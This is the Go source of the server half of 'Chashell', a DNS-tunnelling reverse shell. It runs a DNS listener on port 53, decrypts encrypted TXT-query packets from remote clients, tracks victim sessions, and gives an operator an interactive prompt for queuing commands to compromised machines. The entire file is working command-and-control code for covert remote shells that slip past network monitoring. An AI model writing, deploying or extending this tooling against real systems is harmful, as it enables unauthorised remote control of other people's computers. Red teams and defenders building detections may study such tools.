package main

import (
	"bufio"
	"bytes"
	"chashell/lib/crypto"
	"chashell/lib/protocol"
	"chashell/lib/transport"
	"encoding/hex"
	"fmt"
	"github.com/c-bata/go-prompt"
	"github.com/golang/protobuf/proto"
	"github.com/miekg/dns"
	"log"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Store the current client GUID.
var currentSession string

// Those variables will be assigned during compile-time.
var (
	targetDomain  string
	encryptionKey string
)

// Store the data from clients received when not the active session.
var consoleBuffer = map[string]*bytes.Buffer{}

// Store the packets that will be sent when the client send a polling request.
var packetQueue = map[string][]string{}

// Store the sessions information.
var sessionsMap = map[string]*clientInfo{}

type clientInfo struct {
	hostname  string
	heartbeat int64
	mutex     sync.Mutex
	conn      map[int32]connData
}

type connData struct {
	chunkSize int32
	nonce     []byte
	packets   map[int32]string
}

func (ci *clientInfo) getChunk(chunkID int32) connData {
	// Return the chunk identifier.
	return ci.conn[chunkID]

}

func parseQuery(m *dns.Msg) {
	for _, q := range m.Question {
		switch q.Qtype {
		// Make sure the request is a TXT question.
		case dns.TypeTXT:
			// Strip the target domain and every dots.
			dataPacket := strings.Replace(strings.Replace(q.Name, targetDomain, "", -1), ".", "", -1)

			// Hex-decode the packet.
			dataPacketRaw, err := hex.DecodeString(dataPacket)

			if err != nil {
				log.Printf("Unable to decode data packet : %s", dataPacket)
			}

			// Attempt to decrypt and authenticate the packet.
			output, valid := crypto.Open(dataPacketRaw[24:], dataPacketRaw[:24], encryptionKey)

			if !valid {
				log.Printf("Received invalid/corrupted packet. Dropping.\n")
				break
			}

			// Return the decoded protocol buffers packet.
			message := &protocol.Message{}
			if err := proto.Unmarshal(output, message); err != nil {
				log.Fatalln("Failed to parse message packet:", err)
			}

			// Generic answer.
			answer := "-"

			// Hex-encode the clientGUID to make it printable.
			clientGUID := hex.EncodeToString(message.Clientguid)

			if clientGUID == "" {
				break
			}

			now := time.Now()

			// Check if the clientGUID exist in the session storage.
			session, valid := sessionsMap[clientGUID]

			// If this this a new client, create the associated session.
			if !valid {
				fmt.Printf("New session : %s\n", clientGUID)
				sessionsMap[clientGUID] = &clientInfo{heartbeat: now.Unix(), conn: make(map[int32]connData)}
				session = sessionsMap[clientGUID]
			}

			// Avoid race conditions.
			session.mutex.Lock()

			// Update the heartbeat of the session.
			session.heartbeat = now.Unix()

			// Identify the message type.
			switch u := message.Packet.(type) {
			case *protocol.Message_Pollquery:
				// Check if we have data to send.
				queue, valid := packetQueue[clientGUID]

				if valid && len(queue) > 0 {
					answer = queue[0]
					packetQueue[clientGUID] = queue[1:]
				}

			case *protocol.Message_Chunkstart:
				// We need to allocate a new session in order to store incoming data.
				session.conn[u.Chunkstart.Chunkid] = connData{chunkSize: u.Chunkstart.Chunksize, packets: make(map[int32]string)}

			case *protocol.Message_Chunkdata:
				// Get the storage associated to the chunkId.
				connection := session.getChunk(u.Chunkdata.Chunkid)

				// Store the data packet.
				connection.packets[u.Chunkdata.Chunknum] = string(u.Chunkdata.Packet)

				// Check if we have successfully received all the packets.
				if len(connection.packets) == int(connection.chunkSize) {
					// Rebuild the final data.
					var chunkBuffer bytes.Buffer
					for i := 0; i <= int(connection.chunkSize)-1; i++ {
						chunkBuffer.WriteString(connection.packets[int32(i)])
					}

					// If the current session is the clientGUID, print the data directly.
					if currentSession == clientGUID {
						fmt.Printf("%s", chunkBuffer.Bytes())
					} else {
						consoleBuffer[clientGUID].Write(chunkBuffer.Bytes())
					}
				}

			default:
				log.Printf("Unknown message type received : %v\n", u)
			}
			// Unlock the mutex.
			session.mutex.Unlock()
			rr, _ := dns.NewRR(fmt.Sprintf("%s TXT %s", ".", answer))
			m.Answer = append(m.Answer, rr)

		}

	}
}

func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {

	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = false

	switch r.Opcode {
	case dns.OpcodeQuery:
		parseQuery(m)
	}

	w.WriteMsg(m)
}

func interact(sessionID string) {
	fmt.Println(consoleBuffer[sessionID])
	delete(consoleBuffer, sessionID)

	currentSession = sessionID
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		if scanner.Text() == "background" {
			return
		}
		initPacket, dataPackets := transport.Encode([]byte(scanner.Text()+"\n"), false, encryptionKey, targetDomain, nil)
		_, valid := packetQueue[sessionID]
		if !valid {
			packetQueue[sessionID] = make([]string, 0)
		}
		packetQueue[sessionID] = append(packetQueue[sessionID], initPacket)
		for _, packet := range dataPackets {
			packetQueue[sessionID] = append(packetQueue[sessionID], packet)
		}

	}
	if err := scanner.Err(); err != nil {
		fmt.Fprintln(os.Stderr, "reading standard input:", err)
	}
}

var commands = []prompt.Suggest{
	{Text: "sessions", Description: "Interact with the specified machine."},
	{Text: "exit", Description: "Stop the Chashell Server"},
}

func Completer(d prompt.Document) []prompt.Suggest {
	if d.TextBeforeCursor() == "" {
		return []prompt.Suggest{}
	}
	args := strings.Split(d.TextBeforeCursor(), " ")

	return argumentsCompleter(args)
}

func argumentsCompleter(args []string) []prompt.Suggest {
	if len(args) <= 1 {
		return prompt.FilterHasPrefix(commands, args[0], true)
	}

	first := args[0]
	switch first {
	case "sessions":
		second := args[1]
		if len(args) == 2 {
			sessions := []prompt.Suggest{}
			for clientGUID, clientInfo := range sessionsMap {
				sessions = append(sessions, prompt.Suggest{Text: clientGUID, Description: clientInfo.hostname})
			}

			return prompt.FilterHasPrefix(sessions, second, true)
		}

	}
	return []prompt.Suggest{}
}

func executor(in string) {
	args := strings.Split(in, " ")
	if len(args) > 0 {
		switch args[0] {
		case "exit":
			fmt.Println("Exiting.")
			os.Exit(0)
		case "sessions":
			if len(args) == 2 {
				fmt.Printf("Interacting with session %s.\n", args[1])
				interact(args[1])
			} else {
				fmt.Println("sessions [id]")
			}
		}
	}
}

func main() {

	go func() {
		// attach request handler func
		dns.HandleFunc(targetDomain, handleDNSRequest)

		// start server
		port := 53
		server := &dns.Server{Addr: ":" + strconv.Itoa(port), Net: "udp"}

		log.Printf("Starting DNS Listener %d\n", port)
		err := server.ListenAndServe()
		defer server.Shutdown()
		if err != nil {
			log.Fatalf("Failed to start server: %s\n ", err.Error())
		}
	}()

	go func() {
		for {
			time.Sleep(1 * time.Second)
			now := time.Now()
			for clientGUID, session := range sessionsMap {
				if session.heartbeat+30 < now.Unix() {
					fmt.Printf("Client timed out [%s].\n", clientGUID)
					// Delete from sessions list.
					delete(sessionsMap, clientGUID)
					// Delete all queued packets.
					delete(packetQueue, clientGUID)
				}
			}
		}
	}()

	p := prompt.New(executor, Completer, prompt.OptionPrefix("chashell >>> "))
	p.Run()

	//ShellServer()

}
